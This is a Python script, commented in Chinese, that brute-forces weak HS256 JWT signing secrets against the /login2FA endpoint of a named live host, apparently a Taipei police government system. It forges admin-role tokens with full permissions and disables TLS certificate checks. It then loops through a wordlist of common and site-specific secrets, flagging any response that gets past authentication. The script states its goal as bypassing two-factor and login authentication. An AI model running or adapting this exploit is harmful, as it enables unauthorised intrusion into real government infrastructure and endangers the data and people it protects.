#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JWT HS256 弱密钥爆破 (对 /login2FA)
目标: 找到能通过的 secret → 2FA 绕过 + 认证绕过
"""
import base64, json, hmac, hashlib, ssl, urllib.request, urllib.error, time

CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"

def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=')

payload=json.dumps({"user":{"username":"admin","role":"admin"},"permissions":["ADMIN","USER"],"iat":1700000000,"exp":2000000000,"sub":"admin","jti":"test123"}).encode()
p=b64(payload)
h=b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())

def mk(secret_bytes):
    s=base64.urlsafe_b64encode(hmac.new(secret_bytes, h+b'.'+p, hashlib.sha256).digest()).rstrip(b'=')
    return (h+b'.'+p+b'.'+s).decode()

secrets=['','secret','secret123','password','key','jwt_secret','jwt-secret','jwt','JWT_SECRET','JWTSecret','AUTH_SERVER','auth_secret','authserver','AuthServer','epcr','EP CR','epcr.tpf.gov.tw','tpf','TPF','taipei','Taipei','admin','123456','changeme','jwtsecret','supersecret','mysecret','test','token','secretKey','secret_key','jwt-secret-key','super-secret','auth','Auth','api','API','app','App','production','dev','development','staging','localhost','127.0.0.1','node','Node','express','Express','mongodb','MongoDB','mongo','Mongo','database','db','123','1234','12345','12345678','123456789','qwerty','abc123','admin123','root','root123','pass','Pass','pass123','welcome','Welcome','welcome1','p@ssw0rd','P@ssw0rd','iloveyou','sunshine','princess','football','baseball','shadow','michael','jennifer','trustno1','letmein','monkey','dragon','master','hello','charlie','donald','password1','admin1','root1','test123','pass1234','P@ssword123','Admin123','root1234','admin@123','tpf123','epcr123','taipei123','port4004','4004']

def post2fa(token):
    body=json.dumps({"userToken":token,"domain":"AUTH_SERVER"}).encode()
    req=urllib.request.Request(BASE+"/login2FA",data=body,method="POST",
        headers={"Content-Type":"application/json","Authorization":"Bearer "+token,"User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return None, repr(e)

found=[]
for sec in secrets:
    tok=mk(sec.encode())
    code,body=post2fa(tok)
    sig=body[:40]
    print(f"  secret=[{sec:22s}] -> {code} | {sig}")
    if code==200:
        found.append(("200",sec,body))
        print(f"    *** 200 FOUND! ***")
    elif code not in (401,403,404):
        found.append((str(code),sec,body))
    time.sleep(0.1)

print(f"\n=== 结果: {len(found)} 个非401响应 ===")
for c,s,b in found:
    print(f"  [{c}] secret={s} -> {b[:120]}")
print("DONE")
